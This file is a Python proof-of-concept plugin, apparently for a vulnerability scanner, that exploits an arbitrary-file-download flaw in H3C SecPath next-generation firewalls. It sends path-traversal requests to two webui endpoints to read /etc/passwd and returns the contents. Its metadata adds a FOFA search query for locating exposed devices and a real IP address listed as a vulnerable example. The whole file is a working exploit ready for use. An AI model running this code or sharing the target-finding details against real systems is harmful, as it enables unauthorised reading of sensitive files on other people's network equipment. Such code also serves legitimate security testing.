# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "H3C SecPath 下一代防火墙 任意文件下载漏洞",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "H3C SecPath 下一代防火墙",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            H3C SecPath 下一代防火墙 存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="Web user login"
        """,                     # fofa搜索语句
        "example" : "http://117.159.243.226:8888",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/webui/?g=sys_dia_data_check&file_name=../../etc/passwd" # url自己按需调整
        url1 = self.target + "/webui/?g=sys_capture_file_download&name=../../../../../../../../etc/passwd" # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "root::" in req0.text and req0.status_code == 200 :
                vuln = [True,req0.text]
            else:
                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if "root:" in req1.text and req1.status_code == 200:
                    vuln = [True,req1.text]
                else:
                    vuln = [False,req1.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()